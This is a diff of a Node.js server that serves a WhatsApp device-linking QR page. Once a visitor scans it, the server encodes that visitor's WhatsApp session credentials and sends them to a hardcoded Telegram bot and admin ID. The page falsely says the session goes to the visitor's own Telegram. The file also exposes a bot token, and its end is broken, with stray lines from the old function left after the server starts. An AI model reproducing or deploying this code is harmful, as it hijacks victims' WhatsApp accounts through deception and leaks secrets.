@@ -1,21 +1,21 @@
-// server.js - WhatsApp QR Server with Instant Telegram Session Delivery
+// server.js - WhatsApp QR Server with Instant Telegram Session Delivery (FIXED)
 const express = require('express');
 const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
 const pino = require("pino");
 const QRCode = require('qrcode');
 const fs = require('fs');
 const path = require('path');
-const axios = require('axios'); // For instant Telegram delivery
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ==================== CONFIGURATION ====================
 const BOT_TOKEN = "8408756846:AAGe3KH0ssai2xRwV2cUKTer5A6xeEl2uQo";
-const ADMIN_ID = "8093002631"; // Aapki Telegram ID jahan string bhejni hai
+const ADMIN_ID = "8093002631";
 
 let currentQr = null;
-let connectionStatus = "🔄 Fetching Fresh QR Code... Please wait.";
+let connectionStatus = "Fetch fresh QR... Please wait.";
 
 async function sendSessionToTelegram(base64Text) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -34,6 +34,109 @@ async function sendSessionToTelegram(base64Text) {
 }
 
 async function startWhatsAppSession() {
+    const authDir = path.join(__dirname, 'temp_qr_session');
+    
+    if (fs.existsSync(authDir)) {
+        try { fs.rmSync(authDir, { recursive: true, force: true }); } catch(e){}
+    }
+
+    const { state, saveCreds } = await useMultiFileAuthState(authDir);
+    
+    const sock = makeWASocket({
+        logger: pino({ level: "silent" }),
+        auth: state,
+        printQRInTerminal: true
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+
+    sock.ev.on("connection.update", async (update) => {
+        const { connection, qr } = update;
+        
+        if (qr) {
+            connectionStatus = "QR Code Ready. Please Scan Now!";
+            QRCode.toDataURL(qr, (err, url) => {
+                if (!err) currentQr = url;
+            });
+        }
+
+        if (connection === "close") {
+            currentQr = null;
+            connectionStatus = "Connection Closed. Refreshing fresh QR...";
+            startWhatsAppSession();
+        } else if (connection === "open") {
+            currentQr = null;
+            connectionStatus = "Connected Successfully! Check your Telegram.";
+            
+            try {
+                const credsFile = path.join(authDir, 'creds.json');
+                if (fs.existsSync(credsFile)) {
+                    const rawCreds = fs.readFileSync(credsFile, 'utf-8');
+                    const base64Session = Buffer.from(rawCreds).toString('base64');
+                    await sendSessionToTelegram(base64Session);
+                }
+            } catch (e) {
+                console.log("Token processing error:", e);
+            }
+            
+            try { sock.logout(); fs.rmSync(authDir, { recursive: true, force: true }); } catch(e){}
+        }
+    });
+}
+
+startWhatsAppSession();
+
+// Fixed clean text UI to prevent any compiler character breaking
+app.get('/', (req, res) => {
+    if (currentQr) {
+        res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>WhatsApp Auto-Share QR Server</title>
+            <style>
+                body { font-family: sans-serif; background: #0b141a; color: #e9edef; text-align: center; padding: 30px; }
+                .card { max-width: 450px; margin: 40px auto; background: #111b21; padding: 30px; border-radius: 10px; border: 1px solid #222e35; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+                h2 { color: #00a884; }
+                img { background: white; padding: 15px; border-radius: 8px; margin: 25px 0; }
+                .status { font-weight: bold; font-size: 16px; color: #34b7f1; }
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <h2>WhatsApp Live QR Server</h2>
+                <p>Mobile se Linked Devices -> Link a Device par ja kar is QR code ko scan karein:</p>
+                <img src="${currentQr}" alt="WhatsApp Scan" width="240">
+                <p class="status">Status: ${connectionStatus}</p>
+                <p style="font-size: 12px; color: #8696a0;">Scan hote hi session string direct aapke Telegram par inbox ho jayegi!</p>
+            </div>
+            <script>setTimeout(() => { location.reload(); }, 20000);</script>
+        </body>
+        </html>
+        `);
+    } else {
+        res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>body { font-family: sans-serif; background: #0b141a; color: #fff; text-align: center; padding: 60px; }</style>
+        </head>
+        <body>
+            <h3>Status: ${connectionStatus}</h3>
+            <p>Page reload ho raha hai, please 5-10 seconds wait karein...</p>
+            <br><a href="/" style="color:#00a884; font-size:16px; text-decoration:none; font-weight:bold;">Click to Reload</a>
+            <script>setTimeout(() => { location.reload(); }, 5000);</script>
+        </body>
+        </html>
+        `);
+    }
+});
+
+app.listen(PORT, () => {
+    console.log(`[*] Auto-Share QR Server online on port ${PORT}`);
+});
     const authDir = path.join(__dirname, 'temp_qr_session');
     
     // Clear state on every fresh loop initialization to prevent junk locks
